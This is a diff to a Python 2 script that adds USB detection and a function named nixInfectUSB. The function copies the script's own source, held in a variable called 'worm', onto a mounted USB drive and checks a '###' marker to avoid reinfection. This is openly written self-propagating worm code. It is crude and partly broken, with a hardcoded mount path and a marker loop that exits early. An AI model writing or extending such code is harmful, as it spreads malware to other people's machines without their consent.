@@ -20,20 +20,49 @@ def USBDetect():
 	if os.name == 'posix':
 		print "Found Unix, Linux, OSX, or Other POSIX System...\n"
 		try:
+			user = os.getlogin()
 			d = {}
-			for l in file('/proc/mounts'):
-				if l[0] == '/':
-					l = l.split()
-					d[l[0]] = l[1]
-			print d
-			usb = glob.glob('/dev/sdb*')
-			for lines in d:
-				for lines2 in usb:
-					if lines == lines2:
-						print lines2
-						print True
-					else:
-						print False
+			def NixFindUSB():
+
+				for l in file('/proc/mounts'):
+					if l[0] == '/':
+						l = l.split()
+						d[l[0]] = l[1]
+				print str(d)
+				print ""*3
+				usb = glob.glob('/dev/sdb*')
+
+				for lines in d:
+					for lines2 in usb:
+						if lines == lines2:
+							print lines2
+							print True
+						else:
+							print False
+
+
+			def nixInfectUSB():
+				dir = ("/media/" + user + "/Kali Live/" + __file__)#This is here until we can find the proper mount locations#
+
+				if os.path.isfile(dir):
+					fp = open(dir, 'r')
+					for marker in fp.readlines():
+						if ("###") in marker:
+							print("Found marker...")
+							fp.close()
+							exit()
+						else:
+							print("No marker found...")
+							exit()
+				else:
+					worm = open(__file__, 'r')
+					for code in worm:
+						fp = open(dir, 'a')
+						fp.write(code)
+						fp.close()
+			NixFindUSB()
+			nixInfectUSB()
+
 		except IOError:
 			Error = True
 			print "Permission Error"
